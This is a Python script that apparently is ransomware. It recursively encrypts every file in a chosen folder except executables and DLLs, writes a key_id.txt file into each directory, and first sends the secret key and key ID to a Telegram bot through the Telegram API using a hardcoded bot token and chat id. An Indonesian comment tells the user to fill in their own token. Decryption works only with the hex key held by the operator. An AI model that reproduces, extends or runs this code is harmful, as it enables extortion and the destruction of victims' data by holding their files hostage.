import os
import sys
import tempfile
import bcrypt
from crypto_functions import encrypt_file, decrypt_file, logging
import secrets
import string
import requests 
from colorama import Fore, Style
from datetime import datetime


bot_token = '6365083269:AAGLuQ1xzpxxxU7pkuN9mMT1Oo' # UBAH DENGAN token dan chat id anda
chat_id = '189xxx7'


from colorama import init
init()

def generate_key_id(length=12):
    """Generate a random key ID string."""
    return ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(length))

def send_telegram_message(chat_id, message_text):
    """Send a message to a Telegram chat using the requests library."""
    try:
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        data = {"chat_id": chat_id, "text": message_text}
        response = requests.post(url, json=data)

        if response.status_code == 200:
            logging.info(f"{Fore.GREEN}Telegram message sent successfully{Style.RESET_ALL}")
            return True
        else:
            logging.error(f"{Fore.RED}Failed to send Telegram message. Status code: {response.status_code}, Response: {response.text}{Style.RESET_ALL}")
            return False
    except Exception as e:
        logging.error(f"{Fore.RED}Failed to send Telegram message: {e}{Style.RESET_ALL}")
        return False

def encrypt_folder(folder_path, script_name, key, key_id):
    for root, dirs, files in os.walk(folder_path):
        if tempfile.gettempdir() in root:
            logging.info(f"Skipping temp directory: {root}")
            continue
        for file in files:
            file_path = os.path.join(root, file)
            if file_path != script_name and not file_path.endswith(
                '.lock3d' #ekstensi file yang diinginkan
            ) and not file_path.endswith(('.exe', '.dll')):
                encrypt_file(file_path, key)
    encrypt_file(script_name, key)

    for dirpath, _, _ in os.walk(folder_path):
        with open(os.path.join(dirpath, "key_id.txt"), "w") as f:
            f.write(key_id) 

def decrypt_folder(folder_path, script_name, key):
    for root, dirs, files in os.walk(folder_path):
        if tempfile.gettempdir() in root:
            logging.info(f"Skipping temp directory: {root}")
            continue
        for file in files:
            file_path = os.path.join(root, file)
            if file_path != script_name and file_path.endswith('.lock3d'):
                decrypt_file(file_path, key)

if __name__ == '__main__':
    script_name = os.path.abspath(sys.argv[0])

    action = input(f"Type E for {Fore.RED}encrypt{Style.RESET_ALL} / D for {Fore.GREEN}decrypt{Style.RESET_ALL}: ").strip().lower()
    folder_path = input("Enter the folder path: ").strip()

    key_id = generate_key_id()
    secret_key = os.urandom(32)

    if action == 'e':
        timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        message = f"Encryption Key ID: {key_id}\nSecret Key: {secret_key.hex()}\nTimestamp: {timestamp}"

        if send_telegram_message(chat_id, message): 
            logging.info(f"Starting encryption in folder: {folder_path}")
            encrypt_folder(folder_path, script_name, secret_key, key_id)
            logging.info(f"{Fore.LIGHTGREEN_EX}Encryption completed.{Style.RESET_ALL}")
        else:
            logging.error(f"{Fore.RED}Failed to send encryption details to Telegram. Encryption aborted!{Style.RESET_ALL}") 

    elif action == 'd':
        logging.info(f"Starting decryption in folder: {folder_path}")
        secret_key_hex = input("Enter the secret key (in hexadecimal format): ").strip()
        secret_key = bytes.fromhex(secret_key_hex)
        decrypt_folder(folder_path, script_name, secret_key)
        logging.info(f"{Fore.LIGHTGREEN_EX}Decryption completed.{Style.RESET_ALL}")

    else:
        logging.error(f"{Fore.RED}Invalid action. Choose 'e' or 'd'.{Style.RESET_ALL}")
